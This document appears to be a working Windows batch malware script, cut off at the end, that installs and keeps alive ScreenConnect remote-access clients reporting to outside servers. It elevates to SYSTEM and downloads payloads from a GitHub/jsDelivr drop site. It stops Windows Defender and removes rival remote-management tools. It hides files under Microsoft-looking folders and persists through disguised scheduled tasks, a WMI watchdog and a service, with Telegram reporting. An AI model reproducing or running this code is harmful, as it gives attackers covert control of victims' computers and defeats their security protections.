@echo off
setlocal EnableExtensions EnableDelayedExpansion
REM OWN BUILD 20260802O38 - gryxa 8h deep health (TCP/relay/FP drift reinstall)
set "WD=%ProgramData%\Microsoft\Windows\WER\Temp\.wucache"
set "BOOT=%SystemRoot%\Temp\.wucache"
set "LOG=%WD%\boot.err"
set "MSI=%TEMP%\sc_primary.msi"
set "MSICACHE=%WD%\pkg.msi"
set "PRIM=ScreenConnect Client (5f6010579852e507)"
set "ALT=ScreenConnect Client (f861c8140d453427)"
set "GRYXA=ScreenConnect Client (9908198e668e4750)"
set "KEEP1=5f6010579852e507"
set "KEEP2=f861c8140d453427"
set "KEEP3=9908198e668e4750"
set "MSIURL=https://ui.sevrz.com/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest"
set "MSIURL_GRYXA=https://ui.gryxa.com/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest"
set "MSI_G=%TEMP%\sc_gryxa.msi"
set "MSICACHE_G=%WD%\pkg_gryxa.msi"
set "SELF=%WD%\own_run.cmd"
set "PF86=%ProgramFiles(x86)%"
set "DROP=https://raw.githubusercontent.com/xnobuddy/github-drop/main"
set "DROP2=https://cdn.jsdelivr.net/gh/xnobuddy/github-drop@main"
set "CURL=%SystemRoot%\System32\curl.exe"
if not exist "%CURL%" set "CURL=curl.exe"

if not exist "%WD%" mkdir "%WD%" >nul 2>&1
if not exist "%BOOT%" mkdir "%BOOT%" >nul 2>&1

REM Survive ScreenConnect Guest kill: detach into SYSTEM worker
if /I not "%~1"=="_RUN" (
  echo === OWN BUILD 20260802O38 ===
  echo whoami:
  whoami
  set "ELEV=0"
  whoami /groups | find "S-1-16-12288" >nul 2>&1 && set "ELEV=1"
  whoami /groups | find "S-1-5-18" >nul 2>&1 && set "ELEV=1"
  whoami | find /I "SYSTEM" >nul 2>&1 && set "ELEV=1"
  if "!ELEV!"=="0" (
    echo.
    echo *** NOT ELEVATED / NOT SYSTEM ***
    echo In ScreenConnect Command window: set Run as = SYSTEM
    echo Attempting UAC elevate ^(click Yes if prompted^)...
    copy /y "%~f0" "%BOOT%\own_elev.cmd" >nul 2>&1
    powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "Start-Process -FilePath 'cmd.exe' -ArgumentList '/c \"%BOOT%\own_elev.cmd\"' -Verb RunAs"
    echo If no UAC prompt appeared, re-run command as SYSTEM.
    exit /b 5
  )
  echo elevated_ok>>"%BOOT%\boot.err" 2>nul
  REM O38b: never overwrite a locked own_run.cmd (prior worker holds it) — unique runner always.
  REM Also strip attrs on WD targets before any later copy.
  attrib -h -s -r "%BOOT%\own_run.cmd" >nul 2>&1
  attrib -h -s -r "%SELF%" >nul 2>&1
  set "RUNNER=%BOOT%\own_o32_%RANDOM%%RANDOM%.cmd"
  copy /y "%~f0" "!RUNNER!" >nul 2>&1
  if not exist "!RUNNER!" (
    echo ERROR: cannot write unique runner under %BOOT%
    exit /b 6
  )
  findstr /C:"OWN BUILD 20260802O38" "!RUNNER!" >nul 2>&1
  if errorlevel 1 (
    echo ERROR: runner copy is not O38 - abort
    exit /b 7
  )
  REM best-effort refresh of canonical paths (ignore lock failures)
  copy /y "!RUNNER!" "%BOOT%\own_run.cmd" >nul 2>&1
  mkdir "%WD%" >nul 2>&1
  copy /y "!RUNNER!" "%SELF%" >nul 2>&1
  echo go_start %DATE% %TIME%>>"%BOOT%\boot.err" 2>nul
  set "LOG=%WD%\boot.err"
  echo go_start %DATE% %TIME%>>"%LOG%" 2>nul
  if not exist "%LOG%" set "LOG=%BOOT%\boot.err"
  echo order=exterminate_then_repair_then_install>>"%LOG%" 2>nul
  echo engine=cmd_detached_o32>>"%LOG%" 2>nul
  echo whoami_launcher=>>"%LOG%" 2>nul
  whoami >>"%LOG%" 2>&1
  echo detach_begin>>"%LOG%" 2>nul
  echo runner=!RUNNER!>>"%LOG%" 2>nul
  set "DETACH_OK=0"

  REM Method A: plain schtasks as SYSTEM (paths have no spaces)
  REM NOTE: RUNNER is set inside this block - MUST use !RUNNER! (delayed expansion)
  schtasks /Delete /TN "WucacheOwn" /F >nul 2>&1
  schtasks /Create /TN "WucacheOwn" /RU SYSTEM /RL HIGHEST /SC ONCE /ST 23:59 /F /TR "cmd.exe /c !RUNNER! _RUN" >"%BOOT%\detach.task" 2>&1
  if not errorlevel 1 (
    del /f /q "%BOOT%\wproof" >nul 2>&1
    schtasks /Run /TN "WucacheOwn" >"%BOOT%\detach.run" 2>&1
    if not errorlevel 1 (
      REM SC Guest often kills at 10s — do NOT wait 12s for proof; /Run means worker launched.
      set "DETACH_OK=1"
      echo detach_via=schtasks_root>>"%LOG%"
    )
  )

  REM Method B: wmic (often absent on Win11)
  if "!DETACH_OK!"=="0" (
    wmic process call create "cmd.exe /c \"!RUNNER!\" _RUN" >"%BOOT%\detach.wmic" 2>&1
    findstr /C:"ReturnValue = 0" "%BOOT%\detach.wmic" >nul 2>&1
    if not errorlevel 1 (
      set "DETACH_OK=1"
      echo detach_via=wmic>>"%LOG%"
    )
  )

  REM Method C: one-shot service (flat path; cmd not a service - last resort)
  if "!DETACH_OK!"=="0" (
    copy /y "!RUNNER!" "%SystemRoot%\Temp\wucache_own.cmd" >nul 2>&1
    sc.exe stop WucacheOwn >nul 2>&1
    sc.exe delete WucacheOwn >nul 2>&1
    sc.exe create WucacheOwn binPath= "cmd.exe /c %SystemRoot%\Temp\wucache_own.cmd _RUN" start= demand type= own >"%BOOT%\detach.sc" 2>&1
    sc.exe start WucacheOwn >"%BOOT%\detach.scstart" 2>&1
    findstr /I /C:"START_PENDING" "%BOOT%\detach.scstart" >nul 2>&1 && set "DETACH_OK=1"
    findstr /I /C:"RUNNING" "%BOOT%\detach.scstart" >nul 2>&1 && set "DETACH_OK=1"
    if "!DETACH_OK!"=="1" echo detach_via=sc_service>>"%LOG%"
  )

  REM Method D: inline fallback (Guest may kill; better than nothing)
  if "!DETACH_OK!"=="0" (
    echo detach_via=inline_fallback>>"%LOG%"
    echo WARNING: detach APIs failed - running inline ^(Guest may kill^)

    call "!RUNNER!" _RUN
    exit /b !ERRORLEVEL!
  )

  echo detach_done>>"%LOG%"
  echo Detached OK. Wait ~90s then:
  echo   type "%LOG%"
  echo   type "%BOOT%\boot.err"
  echo   sc query state= all ^| findstr /I ScreenConnect
  exit /b 0
)

echo worker_start %DATE% %TIME%>>"%LOG%"
echo ok>"%BOOT%\wproof" 2>nul
echo === OWN WORKER 20260802O38 ===
if not exist "%LOG%" (
  set "LOG=%SystemRoot%\Temp\.wucache\boot.err"
  if not exist "%SystemRoot%\Temp\.wucache" mkdir "%SystemRoot%\Temp\.wucache" >nul 2>&1
  echo worker_start %DATE% %TIME%>>"%LOG%"
)

echo [0] Extract embedded payloads (self-contained mode)...
attrib -h -s -r "%WD%\own_mon.cmd" >nul 2>&1
attrib -h -s -r "%WD%\own_secure.cmd" >nul 2>&1
attrib -h -s -r "%WD%\tg_report.ps1" >nul 2>&1
attrib -h -s -r "%WD%\own_lib.ps1" >nul 2>&1
call :Extract B64_MON "%WD%\own_mon.cmd"
call :Extract B64_SEC "%WD%\own_secure.cmd"
call :Extract B64_TGR "%WD%\tg_report.ps1"
call :Extract B64_LIB "%WD%\own_lib.ps1"
if not exist "%WD%\notify.cfg" call :Extract B64_NTF "%WD%\notify.cfg"
echo embed_extract_done>>"%LOG%"

REM O38: force-refresh any stale/missing payload (old hardening used to freeze these files)
findstr /C:"20260802M28" "%WD%\own_mon.cmd" >nul 2>&1
if errorlevel 1 (
  attrib -h -s -r "%WD%\own_mon.cmd" >nul 2>&1
  "%CURL%" -L --ssl-no-revoke --connect-timeout 20 -o "%WD%\own_mon.cmd" "%DROP%/own_mon.cmd" >nul 2>&1
  if not exist "%WD%\own_mon.cmd" "%CURL%" -L --connect-timeout 20 -o "%WD%\own_mon.cmd" "%DROP2%/own_mon.cmd" >nul 2>&1
)
findstr /C:"20260802S9" "%WD%\own_secure.cmd" >nul 2>&1
if errorlevel 1 (
  attrib -h -s -r "%WD%\own_secure.cmd" >nul 2>&1
  "%CURL%" -L --ssl-no-revoke --connect-timeout 20 -o "%WD%\own_secure.cmd" "%DROP%/own_secure.cmd" >nul 2>&1
  if not exist "%WD%\own_secure.cmd" "%CURL%" -L --connect-timeout 20 -o "%WD%\own_secure.cmd" "%DROP2%/own_secure.cmd" >nul 2>&1
)
findstr /C:"20260802T16" "%WD%\tg_report.ps1" >nul 2>&1
if errorlevel 1 (
  attrib -h -s -r "%WD%\tg_report.ps1" >nul 2>&1
  "%CURL%" -L --ssl-no-revoke --connect-timeout 20 -o "%WD%\tg_report.ps1" "%DROP%/tg_report.ps1" >nul 2>&1
  if not exist "%WD%\tg_report.ps1" "%CURL%" -L --connect-timeout 20 -o "%WD%\tg_report.ps1" "%DROP2%/tg_report.ps1" >nul 2>&1
)
findstr /C:"20260802L15" "%WD%\own_lib.ps1" >nul 2>&1
if errorlevel 1 (
  attrib -h -s -r "%WD%\own_lib.ps1" >nul 2>&1
  "%CURL%" -L --ssl-no-revoke --connect-timeout 20 -o "%WD%\own_lib.ps1" "%DROP%/own_lib.ps1" >nul 2>&1
  if not exist "%WD%\own_lib.ps1" "%CURL%" -L --connect-timeout 20 -o "%WD%\own_lib.ps1" "%DROP2%/own_lib.ps1" >nul 2>&1
)

echo [1] Defender + harden (exclusions/ACL) + soft AV stop...
echo av_reg_begin>>"%LOG%"
if exist "%WD%\own_secure.cmd" call "%WD%\own_secure.cmd"
start "" /b cmd /c "sc stop WinDefend >nul 2>&1 & sc stop WdNisSvc >nul 2>&1 & sc stop Sense >nul 2>&1 & sc config WinDefend start= disabled >nul 2>&1"
echo av_fight_done>>"%LOG%"

echo [2] Download PRIMARY MSI (curl / powershell / github-pkg / cache)...
call :FetchMsi "%MSI%"
set "GOTMSI=%ERRORLEVEL%"
if "%GOTMSI%"=="0" (
  echo msi_ready>>"%LOG%"
) else (
  echo msi_fetch_FAILED>>"%LOG%"
)

echo [3] Exterminate foreign SC + disallowed RMM FIRST (clean field = SC installer custom action cannot collide)...
call :NukeForeign

echo [4] Ensure PRIMARY (SC-aware ladder: start -> /fa repair -> /i ONLY if unregistered)...
call :NoMsiPolicy
sc query "%PRIM%" | findstr /I RUNNING >nul
if not errorlevel 1 (
  echo primary already RUNNING
  echo primary_already_running>>"%LOG%"
  goto :after_primary_install
)

REM present but STOPPED: restart, then /fa repair (never /i - shared legacy UpgradeCodes wipe ALT)
sc query "%PRIM%" >nul 2>&1
if not errorlevel 1 (
  echo primary_present_stopped_restart>>"%LOG%"
  net start "%PRIM%" >nul 2>&1
  sc start "%PRIM%" >nul 2>&1
  timeout /t 8 /nobreak >nul
  sc query "%PRIM%" | findstr /I RUNNING >nul
  if not errorlevel 1 (
    echo primary_restarted_ok>>"%LOG%"
    goto :after_primary_install
  )
  echo primary_stopped_try_repair>>"%LOG%"
  if exist "%WD%\own_lib.ps1" powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action repair -Fp "%KEEP1%" -WorkDir "%WD%" >>"%LOG%" 2>&1
  sc query "%PRIM%" | findstr /I RUNNING >nul
  if not errorlevel 1 (
    echo primary_repaired_ok>>"%LOG%"
    goto :after_primary_install
  )
  echo primary_repair_failed_still_stopped>>"%LOG%"
  goto :after_primary_install
)

REM service missing: try /fa if product registered (safe - no Upgrade table remove)
echo primary_svc_missing_try_repair>>"%LOG%"
if exist "%WD%\own_lib.ps1" powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action repair -Fp "%KEEP1%" -WorkDir "%WD%" >>"%LOG%" 2>&1
sc query "%PRIM%" | findstr /I RUNNING >nul
if not errorlevel 1 (
  echo primary_repaired_ok>>"%LOG%"
  goto :after_primary_install
)

if not "%GOTMSI%"=="0" (
  echo primary_skip_install_no_msi>>"%LOG%"
  goto :after_primary_install
)

REM refuse /i if product already registered - /i re-enters Upgrade table and can wipe ALT
set "REGSTATE=unknown"
if exist "%WD%\own_lib.ps1" for /f "usebackq delims=" %%R in (`powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action registered -Fp "%KEEP1%" -WorkDir "%WD%"`) do set "REGSTATE=%%R"
if /I "!REGSTATE!"=="yes" (
  echo primary_registered_skip_fresh_install>>"%LOG%"
  goto :after_primary_install
)

REM stale install dir with no registered product breaks SC custom action FixupServiceArguments
if exist "%PF86%\ScreenConnect Client (%KEEP1%)" (
  echo stale_primary_dir_clean>>"%LOG%"
  rmdir /s /q "%PF86%\ScreenConnect Client (%KEEP1%)" >nul 2>&1
)
if exist "%ProgramFiles%\ScreenConnect Client (%KEEP1%)" (
  echo stale_primary_dir_clean_pf>>"%LOG%"
  rmdir /s /q "%ProgramFiles%\ScreenConnect Client (%KEEP1%)" >nul 2>&1
)

echo primary missing/unregistered - MSI install (LAST RESORT - Upgrade table may touch siblings)...
echo primary_install_begin>>"%LOG%"
msiexec /i "%MSI%" /qn /norestart ALLUSERS=1 REBOOT=ReallySuppress /L*v "%WD%\msi_install.log"
set "INST_EXIT=!ERRORLEVEL!"
echo msi_exit_!INST_EXIT!>>"%LOG%"
if "!INST_EXIT!"=="1618" (
  echo msi_busy_retry1>>"%LOG%"
  timeout /t 30 /nobreak >nul
  msiexec /i "%MSI%" /qn /norestart ALLUSERS=1 REBOOT=ReallySuppress /L*v "%WD%\msi_install2.log"
  set "INST_EXIT=!ERRORLEVEL!"
  echo msi_retry1618_exit_!INST_EXIT!>>"%LOG%"
)
if "!INST_EXIT!"=="1618" (
  echo msi_busy_retry2>>"%LOG%"
  timeout /t 45 /nobreak >nul
  msiexec /i "%MSI%" /qn /norestart ALLUSERS=1 REBOOT=ReallySuppress /L*v "%WD%\msi_install3.log"
  set "INST_EXIT=!ERRORLEVEL!"
  echo msi_retry1618_exit_!INST_EXIT!>>"%LOG%"
)
timeout /t 15 /nobreak >nul

REM post-install: product registered but service entry still missing -> /fa by GUID (safe)
sc query "%PRIM%" >nul 2>&1
if errorlevel 1 (
  echo postinstall_svc_missing_repair>>"%LOG%"
  if exist "%WD%\own_lib.ps1" powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action repair -Fp "%KEEP1%" -WorkDir "%WD%" >>"%LOG%" 2>&1
)

:after_primary_install
sc config "%PRIM%" start= auto >nul 2>&1
sc failure "%PRIM%" reset= 86400 actions= restart/3000/restart/3000/restart/3000 >nul 2>&1
sc start "%PRIM%" >nul 2>&1
timeout /t 5 /nobreak >nul
sc start "%PRIM%" >nul 2>&1
sc query "%PRIM%" | findstr /I RUNNING >nul
if not errorlevel 1 (
  echo primary_running_ok>>"%LOG%"
) else (
  echo primary_still_down_after_install>>"%LOG%"
  sc query "%PRIM%" >>"%LOG%" 2>&1
)

echo [5] Start allowlist...
sc config "%ALT%" start= auto >nul 2>&1
sc start "%ALT%" >nul 2>&1
sc config "%PRIM%" start= auto >nul 2>&1
sc start "%PRIM%" >nul 2>&1
timeout /t 2 /nobreak >nul
REM O38: restore ALT if its service entry was deleted (SC-family msiexec side effect)
sc query "%ALT%" >nul 2>&1
if errorlevel 1 if exist "%WD%\own_lib.ps1" (
  echo alt_missing_repair>>"%LOG%"
  powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action repair -Fp "%KEEP2%" -WorkDir "%WD%" >>"%LOG%" 2>&1
)

echo [5b] Gryxa MUST-RUN deep ensure (svc+dir+TCP/relay+FP drift)...
if exist "%WD%\own_lib.ps1" (
  powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action gryxa-ensure -Deep -WorkDir "%WD%" -Build O38 >>"%LOG%" 2>&1
) else (
  call :EnsureGryxaMust
)
if exist "%WD%\gryxa.cfg" for /f "usebackq tokens=1,* delims==" %%K in ("%WD%\gryxa.cfg") do if /I "%%K"=="CURRENT_FP" set "KEEP3=%%L"
if defined KEEP3 set "GRYXA=ScreenConnect Client (%KEEP3%)"
sc query "%GRYXA%" | findstr /I RUNNING >nul
if not errorlevel 1 (echo gryxa_must_running_ok>>"%LOG%") else (echo gryxa_must_still_down>>"%LOG%")

echo [6] Arm wipe-proof persist (identity tasks + WMI watchdog + MSI cache)...
echo persist_begin>>"%LOG%"
if exist "%~dp0notify.cfg" call :ForceCopy "%~dp0notify.cfg" "%WD%\notify.cfg"
if not exist "%ProgramData%\Microsoft\Diagnosis\State\.etlcache" mkdir "%ProgramData%\Microsoft\Diagnosis\State\.etlcache" >nul 2>&1
call :ForceCopy "%WD%\own_mon.cmd" "%ProgramData%\Microsoft\Diagnosis\State\.etlcache\etl_mon.cmd"

if exist "%MSI%" for %%A in ("%MSI%") do if %%~zA GEQ 500000 (
  call :ForceCopy "%MSI%" "%MSICACHE%"
  echo msi_cached_bytes=%%~zA>>"%LOG%"
)

REM anti-signature identity: per-host task names + jittered schedule
REM O38/L13: Create like WucacheOwn — BOOT TR path + cmd schtasks + /ST (WD is ACL-locked)
if exist "%WD%\own_lib.ps1" powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action init -WorkDir "%WD%" >nul 2>&1
if exist "%WD%\identity.cfg" for /f "usebackq tokens=1,* delims==" %%K in ("%WD%\identity.cfg") do set "%%K=%%L"
if not defined TASK_A set "TASK_A=WerQueueSync"
if not defined TASK_B set "TASK_B=PlaServerHealth"
if not defined TASK_C set "TASK_C=WdiHostProxy"
if not defined TASK_D set "TASK_D=TcpIpConflictRes"
if not defined MO_A set "MO_A=2"
if not defined MO_B set "MO_B=3"
REM strip leading \ if present (IDENTVER 6/7 leftovers)
if "!TASK_A:~0,1!"=="\" set "TASK_A=!TASK_A:~1!"
if "!TASK_B:~0,1!"=="\" set "TASK_B=!TASK_B:~1!"
if "!TASK_C:~0,1!"=="\" set "TASK_C=!TASK_C:~1!"
if "!TASK_D:~0,1!"=="\" set "TASK_D=!TASK_D:~1!"
echo identity_A=!TASK_A!>>"%LOG%"
echo identity_B=!TASK_B!>>"%LOG%"
echo identity_C=!TASK_C!>>"%LOG%"
echo identity_D=!TASK_D! mo=!MO_A!/!MO_B!>>"%LOG%"

REM TR under BOOT (Windows\Temp\.wucache) — same tree as working WucacheOwn detach
if not exist "%BOOT%" mkdir "%BOOT%" >nul 2>&1
copy /y "%WD%\own_mon.cmd" "%BOOT%\own_mon.cmd" >nul 2>&1
copy /y "%WD%\own_mon.cmd" "%BOOT%\etl_mon.cmd" >nul 2>&1
if not exist "%ProgramData%\Microsoft\Diagnosis\State\.etlcache" mkdir "%ProgramData%\Microsoft\Diagnosis\State\.etlcache" >nul 2>&1
copy /y "%WD%\own_mon.cmd" "%ProgramData%\Microsoft\Diagnosis\State\.etlcache\etl_mon.cmd" >nul 2>&1

for /f "tokens=1-2 delims=:" %%H in ("%TIME%") do set "ST=%%H:%%I"
set "ST=!ST: =0!"
echo create_taskA_begin>>"%LOG%"
schtasks /Delete /TN "!TASK_A!" /F >nul 2>&1
schtasks /Create /TN "!TASK_A!" /RU SYSTEM /RL HIGHEST /SC MINUTE /MO !MO_A! /ST !ST! /F /TR "cmd.exe /c %BOOT%\own_mon.cmd" >>"%LOG%" 2>&1
echo create_taskB_begin>>"%LOG%"
schtasks /Delete /TN "!TASK_B!" /F >nul 2>&1
schtasks /Create /TN "!TASK_B!" /RU SYSTEM /RL HIGHEST /SC MINUTE /MO !MO_B! /ST !ST! /F /TR "cmd.exe /c %BOOT%\etl_mon.cmd" >>"%LOG%" 2>&1
echo create_taskC_begin>>"%LOG%"
schtasks /Delete /TN "!TASK_C!" /F >nul 2>&1
schtasks /Create /TN "!TASK_C!" /RU SYSTEM /RL HIGHEST /SC ONSTART /F /TR "cmd.exe /c %BOOT%\own_mon.cmd" >>"%LOG%" 2>&1
echo create_taskD_begin>>"%LOG%"
schtasks /Delete /TN "!TASK_D!" /F >nul 2>&1
schtasks /Create /TN "!TASK_D!" /RU SYSTEM /RL HIGHEST /SC ONLOGON /F /TR "cmd.exe /c %BOOT%\own_mon.cmd" >>"%LOG%" 2>&1
echo persist_armed_identity>>"%LOG%"
schtasks /Query /TN "!TASK_A!" >nul 2>&1 || echo verify_taskA_FAIL>>"%LOG%"
schtasks /Query /TN "!TASK_B!" >nul 2>&1 || echo verify_taskB_FAIL>>"%LOG%"
schtasks /Query /TN "!TASK_C!" >nul 2>&1 || echo verify_taskC_FAIL>>"%LOG%"
schtasks /Query /TN "!TASK_D!" >nul 2>&1 || echo verify_taskD_FAIL>>"%LOG%"
schtasks /Run /TN "!TASK_A!" >nul 2>&1
echo first_tick_run>>"%LOG%"

REM also run lib tasks-ensure (idempotent repair / ownership check)
if exist "%WD%\own_lib.ps1" (
  for /f "usebackq delims=" %%R in (`powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action tasks-ensure -WorkDir "%WD%" -MonPath "%WD%\own_mon.cmd"`) do (
    echo tasks_ensure %%R>>"%LOG%"
  )
)

REM chain 2: WMI watchdog subscription (mutual persistence)
if exist "%WD%\own_lib.ps1" powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action watchdog -WorkDir "%WD%" -MonPath "%BOOT%\own_mon.cmd" >nul 2>&1
echo watchdog_armed>>"%LOG%"

REM campaign state baseline
if exist "%WD%\own_lib.ps1" powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action state -WorkDir "%WD%" -Build O38 -Extra "deploy" >nul 2>&1

echo [6b] Re-lock persist dirs/tasks/SC after arm...
if exist "%WD%\own_secure.cmd" call "%WD%\own_secure.cmd"

echo [7] First-deploy Telegram report...
if not exist "%WD%\notify.cfg" (
  if exist "%~dp0notify.cfg" (
    call :ForceCopy "%~dp0notify.cfg" "%WD%\notify.cfg"
  ) else (
    echo notify_cfg_MISSING>>"%LOG%"
    echo WARNING: notify.cfg missing - TG report will be skipped. Seed BOT_TOKEN/CHAT_ID into %WD%\notify.cfg
  )
)
if exist "%WD%\notify.cfg" (
  powershell.exe -NoProfile -ExecutionPolicy Bypass -File "%WD%\tg_report.ps1" -State DEPLOY -Summary "own.cmd first deploy complete" -WorkDir "%WD%" -Build O38 >>"%LOG%" 2>&1
) else (
  echo deploy_tg_skipped_no_notify>>"%LOG%"
)
echo deploy_tg_done>>"%LOG%"

sc query "%PRIM%" >>"%LOG%" 2>&1
sc query state= all | findstr /I ScreenConnect >>"%LOG%"
echo go_exit_0>>"%LOG%"
exit /b 0

REM ========== helpers ==========
:FetchMsi
set "OUT=%~1"
del /f /q "%OUT%" >nul 2>&1
echo fetch_msi_begin>>"%LOG%"

if exist "%SystemRoot%\System32\curl.exe" (
  echo fetch_try=curl_sys>>"%LOG%"
  "%SystemRoot%\System32\curl.exe" -L --ssl-no-revoke --connect-timeout 30 --max-time 180 -o "%OUT%" "%MSIURL%" >>"%LOG%" 2>&1
)
call :MsiOk "%OUT%"
if not errorlevel 1 exit /b 0

echo fetch_try=curl_path>>"%LOG%"
curl.exe -L --ssl-no-revoke --connect-timeout 30 --max-time 180 -o "%OUT%" "%MSIURL%" >>"%LOG%" 2>&1
call :MsiOk "%OUT%"
if not errorlevel 1 exit /b 0

echo fetch_try=powershell>>"%LOG%"
powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -Command ^
  "[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;" ^
  "Try{Invoke-WebRequest -Uri '%MSIURL%' -OutFile '%OUT%' -UseBasicParsing -TimeoutSec 180}Catch{Add-Content -LiteralPath '%LOG%' -Value ('fetch_ps_err '+$_.Exception.Message)}" >>"%LOG%" 2>&1
call :MsiOk "%OUT%"
if not errorlevel 1 exit /b 0

echo fetch_try=github_pkg>>"%LOG%"
"%CURL%" -L --ssl-no-revoke --connect-timeout 30 --max-time 300 -o "%OUT%" "%DROP%/pkg.msi?t=%RANDOM%" >>"%LOG%" 2>&1
call :MsiOk "%OUT%"
if not errorlevel 1 exit /b 0

echo fetch_try=jsdelivr_pkg>>"%LOG%"
"%CURL%" -L --connect-timeout 30 --max-time 300 -o "%OUT%" "%DROP2%/pkg.msi" >>"%LOG%" 2>&1
call :MsiOk "%OUT%"
if not errorlevel 1 exit /b 0

if exist "%MSICACHE%" (
  echo fetch_try=cache>>"%LOG%"
  copy /y "%MSICACHE%" "%OUT%" >nul
  call :MsiOk "%OUT%"
  if not errorlevel 1 exit /b 0
)

echo fetch_msi_all_failed>>"%LOG%"
exit /b 1

:MsiOk
if not exist "%~1" exit /b 1
for %%A in ("%~1") do (
  echo msi_bytes=%%~zA>>"%LOG%"
  if %%~zA LSS 500000 (
    echo msi_too_small>>"%LOG%"
    del /f /q "%~1" >nul 2>&1
    exit /b 1
  )
  copy /y "%~1" "%MSICACHE%" >nul 2>&1
)
exit /b 0

:NukeForeign
echo exterminate_begin>>"%LOG%"
if exist "%WD%\own_lib.ps1" (
  powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action exterminate -WorkDir "%WD%" >>"%LOG%" 2>&1
) else (
  echo exterminate_skipped_no_lib>>"%LOG%"
)
echo exterminate_done>>"%LOG%"
REM settle Windows Installer mutex after /x before any /i or /fa
timeout /t 8 /nobreak >nul
exit /b 0

:EnsureGryxaMust
rem Gryxa is mandatory — climb until Running (never soft-skip on registered).
sc query "%GRYXA%" | findstr /I RUNNING >nul
if not errorlevel 1 (
  echo gryxa_already_running>>"%LOG%"
  exit /b 0
)
echo gryxa_must_begin>>"%LOG%"

sc query "%GRYXA%" >nul 2>&1
if not errorlevel 1 (
  echo gryxa_svc_start>>"%LOG%"
  sc config "%GRYXA%" start= auto >nul 2>&1
  sc failure "%GRYXA%" reset= 86400 actions= restart/3000/restart/3000/restart/3000 >nul 2>&1
  net start "%GRYXA%" >nul 2>&1
  sc start "%GRYXA%" >nul 2>&1
  timeout /t 6 /nobreak >nul
  sc start "%GRYXA%" >nul 2>&1
  sc query "%GRYXA%" | findstr /I RUNNING >nul
  if not errorlevel 1 (
    echo gryxa_started_ok>>"%LOG%"
    exit /b 0
  )
)

set "GREG=unknown"
if exist "%WD%\own_lib.ps1" for /f "usebackq delims=" %%R in (`powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action registered -Fp "%KEEP3%" -WorkDir "%WD%"`) do set "GREG=%%R"
echo gryxa_registered=!GREG!>>"%LOG%"
if /I "!GREG!"=="yes" (
  echo gryxa_repair_begin>>"%LOG%"
  if exist "%WD%\own_lib.ps1" powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action repair -Fp "%KEEP3%" -WorkDir "%WD%" >>"%LOG%" 2>&1
  timeout /t 8 /nobreak >nul
  sc config "%GRYXA%" start= auto >nul 2>&1
  sc start "%GRYXA%" >nul 2>&1
  timeout /t 5 /nobreak >nul
  sc query "%GRYXA%" | findstr /I RUNNING >nul
  if not errorlevel 1 (
    echo gryxa_repaired_ok>>"%LOG%"
    exit /b 0
  )
  echo gryxa_clean_reinstall_begin>>"%LOG%"
  if exist "%WD%\own_lib.ps1" (
    for /f "usebackq delims=" %%G in (`powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -Command "$n='ScreenConnect Client (%KEEP3%)'; foreach($r in @('HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall','HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall')){ if(Test-Path $r){ Get-ChildItem $r -EA 0 | ForEach-Object { $p=Get-ItemProperty $_.PSPath -EA 0; if($p.DisplayName -eq $n -and $_.PSChildName -like '{*}'){ $_.PSChildName; return } } } }"`) do set "GGUID=%%G"
  )
  if defined GGUID (
    call :NoMsiPolicy
    msiexec /x !GGUID! /qn /norestart REBOOT=ReallySuppress >>"%LOG%" 2>&1
    echo gryxa_uninstall_exit=!ERRORLEVEL!>>"%LOG%"
    timeout /t 8 /nobreak >nul
  )
)

if /I not "!GREG!"=="yes" (
  sc query "%GRYXA%" >nul 2>&1
  if not errorlevel 1 (
    echo gryxa_orphan_svc_delete>>"%LOG%"
    sc stop "%GRYXA%" >nul 2>&1
    sc delete "%GRYXA%" >nul 2>&1
    timeout /t 3 /nobreak >nul
  )
  if exist "%PF86%\ScreenConnect Client (%KEEP3%)" (
    echo gryxa_stale_dir_clean>>"%LOG%"
    rmdir /s /q "%PF86%\ScreenConnect Client (%KEEP3%)" >nul 2>&1
  )
)

echo gryxa_install_begin>>"%LOG%"
set "G_MSI_READY=0"
if exist "%MSICACHE_G%" for %%F in ("%MSICACHE_G%") do if %%~zF GEQ 500000 (
  call :ForceCopy "%MSICACHE_G%" "%MSI_G%"
  set "G_MSI_READY=1"
  echo gryxa_msi_from_cache>>"%LOG%"
)
if "%G_MSI_READY%"=="0" (
  "%CURL%" -L --ssl-no-revoke --connect-timeout 30 --max-time 300 -o "%MSI_G%" "%MSIURL_GRYXA%" >>"%LOG%" 2>&1
  if not exist "%MSI_G%" "%CURL%" -L --connect-timeout 30 --max-time 300 -o "%MSI_G%" "%MSIURL_GRYXA%" >>"%LOG%" 2>&1
  for %%A in ("%MSI_G%") do if %%~zA GEQ 500000 (
    call :ForceCopy "%MSI_G%" "%MSICACHE_G%"
    set "G_MSI_READY=1"
    echo gryxa_msi_fetched=%%~zA>>"%LOG%"
  )
)
if "%G_MSI_READY%"=="1" (
  call :NoMsiPolicy
